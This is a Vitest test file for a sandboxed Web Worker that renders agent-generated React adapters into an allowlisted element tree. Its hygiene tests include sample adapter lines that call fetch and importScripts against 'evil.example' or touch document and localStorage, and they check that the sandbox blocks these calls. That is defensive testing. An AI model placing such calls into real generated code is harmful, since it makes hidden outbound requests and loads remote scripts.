// @vitest-environment node
import { afterEach, describe, expect, it, vi } from "vitest";

import { __TIER2_DS_COMPONENTS_FOR_TESTS } from "./Tier2Loader";
import type { Tier2JsonElement, Tier2WorkerRequest } from "./Tier2Loader";
import {
  createTier2WorkerFactory,
  executeAdapterRender,
  TIER2_WORKER_DS_COMPONENT_NAMES,
  TIER2_WORKER_SOURCE,
} from "./tier2Worker";

function req(over: Partial<Tier2WorkerRequest>): Tier2WorkerRequest {
  return {
    kind: "render",
    adapterSource: "",
    scheme: "record",
    version: 1,
    mode: "current",
    payload: null,
    ...over,
  };
}

// A generated-shape adapter: ESM `import`/`export` + `React.createElement`.
const GENERATED_SOURCE = [
  'import * as React from "react";',
  'import { tokens } from "@0x-copilot/design-system";',
  "",
  "void tokens;",
  "",
  'function matches(uri) { return typeof uri === "string" && uri.indexOf("record://") === 0; }',
  "",
  "export const renderCurrent = (state) =>",
  '  React.createElement("div", { className: "rec" },',
  '    React.createElement("h3", null, "Record"),',
  "    String(state && state.title));",
  "",
  'export const renderDiff = (diff) => React.createElement("div", null, "diff");',
  "",
  "export const adapter = {",
  '  scheme: "record",',
  "  matches: matches,",
  "  renderCurrent: renderCurrent,",
  "  renderDiff: renderDiff,",
  '  metadata: { origin: "agent-generated", schemaVersion: 1 },',
  "};",
  "",
].join("\n");

describe("executeAdapterRender — happy path (AC1)", () => {
  it("renders a known-good generated adapter to the allowlisted element tree", () => {
    const res = executeAdapterRender(
      req({ adapterSource: GENERATED_SOURCE, payload: { title: "Hello" } }),
    );
    expect(res.kind).toBe("rendered");
    if (res.kind !== "rendered") return;
    expect(res.tree).toEqual<Tier2JsonElement>({
      tag: "div",
      props: { className: "rec" },
      children: [{ tag: "h3", children: ["Record"] }, "Hello"],
    });
  });

  it("renders the diff branch when mode is 'diff'", () => {
    const res = executeAdapterRender(
      req({
        adapterSource: GENERATED_SOURCE,
        mode: "diff",
        payload: { field_changes: [] },
      }),
    );
    expect(res.kind).toBe("rendered");
    if (res.kind !== "rendered") return;
    expect(res.tree).toEqual<Tier2JsonElement>({
      tag: "div",
      children: ["diff"],
    });
  });

  it("maps a design-system component import to a ds:<Name> tag", () => {
    const source = [
      'import * as React from "react";',
      'import { Button } from "@0x-copilot/design-system";',
      "export const renderCurrent = (s) =>",
      '  React.createElement(Button, { variant: "primary" }, "Click");',
      'export const renderDiff = (d) => React.createElement("div", null);',
      'export const adapter = { scheme: "x", matches: () => true,',
      "  renderCurrent: renderCurrent, renderDiff: renderDiff,",
      '  metadata: { origin: "agent-generated", schemaVersion: 1 } };',
    ].join("\n");
    const res = executeAdapterRender(req({ adapterSource: source }));
    expect(res.kind).toBe("rendered");
    if (res.kind !== "rendered") return;
    expect(res.tree).toEqual<Tier2JsonElement>({
      tag: "ds:Button",
      props: { variant: "primary" },
      children: ["Click"],
    });
  });

  it("accepts a CommonJS module.exports adapter returning {type,props,children}", () => {
    const source = [
      "module.exports = {",
      '  scheme: "email",',
      '  matches: (uri) => uri.indexOf("email://") === 0,',
      '  renderCurrent: () => ({ type: "div", props: {}, children: ["ok"] }),',
      '  renderDiff: () => ({ type: "span", props: {}, children: [] }),',
      '  metadata: { origin: "agent-generated", schemaVersion: 1 },',
      "};",
    ].join("\n");
    const res = executeAdapterRender(req({ adapterSource: source }));
    expect(res.kind).toBe("rendered");
    if (res.kind !== "rendered") return;
    expect(res.tree).toEqual<Tier2JsonElement>({
      tag: "div",
      children: ["ok"],
    });
  });

  it("strips event handlers and functions from serialized props (structured-clone safe)", () => {
    const source = [
      'import * as React from "react";',
      "export const renderCurrent = (s) =>",
      '  React.createElement("button", { onClick: () => {}, title: "t" }, "x");',
      'export const renderDiff = (d) => React.createElement("div", null);',
      'export const adapter = { scheme: "x", matches: () => true,',
      "  renderCurrent: renderCurrent, renderDiff: renderDiff,",
      '  metadata: { origin: "agent-generated", schemaVersion: 1 } };',
    ].join("\n");
    const res = executeAdapterRender(req({ adapterSource: source }));
    expect(res.kind).toBe("rendered");
    if (res.kind !== "rendered") return;
    expect(res.tree).toEqual<Tier2JsonElement>({
      tag: "button",
      props: { title: "t" },
      children: ["x"],
    });
    // The serialized tree must survive structured clone (postMessage).
    expect(() => structuredClone(res.tree)).not.toThrow();
  });
});

describe("executeAdapterRender — worker hygiene (AC2)", () => {
  it.each([
    ["fetch", 'fetch("http://evil.example/x");'],
    ["XMLHttpRequest", "new XMLHttpRequest();"],
    ["importScripts", 'importScripts("http://evil.example/x");'],
    ["document", "document.body.innerHTML = 'x';"],
    ["localStorage", 'localStorage.setItem("k", "v");'],
  ])("a source referencing %s fails (globals scrubbed)", (_name, stmt) => {
    const source = [
      'import * as React from "react";',
      "export const renderCurrent = (s) => {",
      "  " + stmt,
      '  return React.createElement("div", null, "unreachable");',
      "};",
      'export const renderDiff = (d) => React.createElement("div", null);',
      'export const adapter = { scheme: "x", matches: () => true,',
      "  renderCurrent: renderCurrent, renderDiff: renderDiff,",
      '  metadata: { origin: "agent-generated", schemaVersion: 1 } };',
    ].join("\n");
    const res = executeAdapterRender(req({ adapterSource: source }));
    expect(res.kind).toBe("failed");
    if (res.kind !== "failed") return;
    expect(res.reason).toBe("throw");
  });

  it("reports 'oom' when the render exceeds the node budget", () => {
    // A source that builds a runaway tree via recursion.
    const source = [
      'import * as React from "react";',
      "function deep(n) {",
      '  if (n <= 0) return "leaf";',
      '  return React.createElement("div", null, deep(n - 1), deep(n - 1));',
      "}",
      "export const renderCurrent = (s) => deep(14);",
      'export const renderDiff = (d) => React.createElement("div", null);',
      'export const adapter = { scheme: "x", matches: () => true,',
      "  renderCurrent: renderCurrent, renderDiff: renderDiff,",
      '  metadata: { origin: "agent-generated", schemaVersion: 1 } };',
    ].join("\n");
    const res = executeAdapterRender(req({ adapterSource: source }));
    expect(res.kind).toBe("failed");
    if (res.kind !== "failed") return;
    expect(res.reason).toBe("oom");
  });

  it("reports 'throw' when the adapter render throws", () => {
    const source = [
      'import * as React from "react";',
      "export const renderCurrent = (s) => { throw new Error('boom'); };",
      'export const renderDiff = (d) => React.createElement("div", null);',
      'export const adapter = { scheme: "x", matches: () => true,',
      "  renderCurrent: renderCurrent, renderDiff: renderDiff,",
      '  metadata: { origin: "agent-generated", schemaVersion: 1 } };',
    ].join("\n");
    const res = executeAdapterRender(req({ adapterSource: source }));
    expect(res.kind).toBe("failed");
    if (res.kind !== "failed") return;
    expect(res.reason).toBe("throw");
    expect(res.detail).toContain("boom");
  });

  it("reports 'shape' when the adapter exposes no render functions", () => {
    const res = executeAdapterRender(
      req({ adapterSource: "module.exports = { scheme: 'x' };" }),
    );
    expect(res.kind).toBe("failed");
    if (res.kind !== "failed") return;
    expect(res.reason).toBe("shape");
  });
});

describe("TIER2_WORKER_DS_COMPONENT_NAMES — allowlist parity (PRD-10 non-goal: no growth)", () => {
  it("matches the loader's DS_COMPONENTS keys exactly", () => {
    const loaderNames = Object.keys(__TIER2_DS_COMPONENTS_FOR_TESTS).sort();
    const workerNames = [...TIER2_WORKER_DS_COMPONENT_NAMES].sort();
    expect(workerNames).toEqual(loaderNames);
  });
});

describe("TIER2_WORKER_SOURCE — self-contained worker bundle", () => {
  it("is syntactically valid and wires self.onmessage", () => {
    expect(TIER2_WORKER_SOURCE).toContain("self.onmessage");
    expect(TIER2_WORKER_SOURCE).toContain("executeAdapterRender");
    // The bundle must compile as a standalone script body.
    expect(() => new Function("self", TIER2_WORKER_SOURCE)).not.toThrow();
  });
});

describe("createTier2WorkerFactory", () => {
  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it("throws when Web Workers are unavailable (graceful tier-3 fallback)", () => {
    vi.stubGlobal("Worker", undefined);
    const factory = createTier2WorkerFactory();
    expect(() => factory()).toThrow(/Web Worker/);
  });

  it("constructs a Worker from a Blob object URL and delegates postMessage/terminate", () => {
    const posted: unknown[] = [];
    let terminated = false;
    const workerInstances: Array<{ url: string }> = [];
    class FakeWorker {
      constructor(url: string) {
        workerInstances.push({ url });
      }
      postMessage(v: unknown): void {
        posted.push(v);
      }
      terminate(): void {
        terminated = true;
      }
      addEventListener(): void {}
      removeEventListener(): void {}
    }
    const createObjectURL = vi.fn(() => "blob:tier2-fake");
    const revokeObjectURL = vi.fn();
    vi.stubGlobal("Worker", FakeWorker as unknown as typeof Worker);
    vi.stubGlobal("URL", {
      createObjectURL,
      revokeObjectURL,
    } as unknown as typeof URL);

    const factory = createTier2WorkerFactory();
    const worker = factory();
    expect(createObjectURL).toHaveBeenCalledTimes(1);
    expect(workerInstances).toEqual([{ url: "blob:tier2-fake" }]);
    // The URL is revoked immediately after construction (no per-render leak).
    expect(revokeObjectURL).toHaveBeenCalledWith("blob:tier2-fake");

    worker.postMessage({ hello: "world" });
    expect(posted).toEqual([{ hello: "world" }]);
    worker.terminate();
    expect(terminated).toBe(true);
  });
});
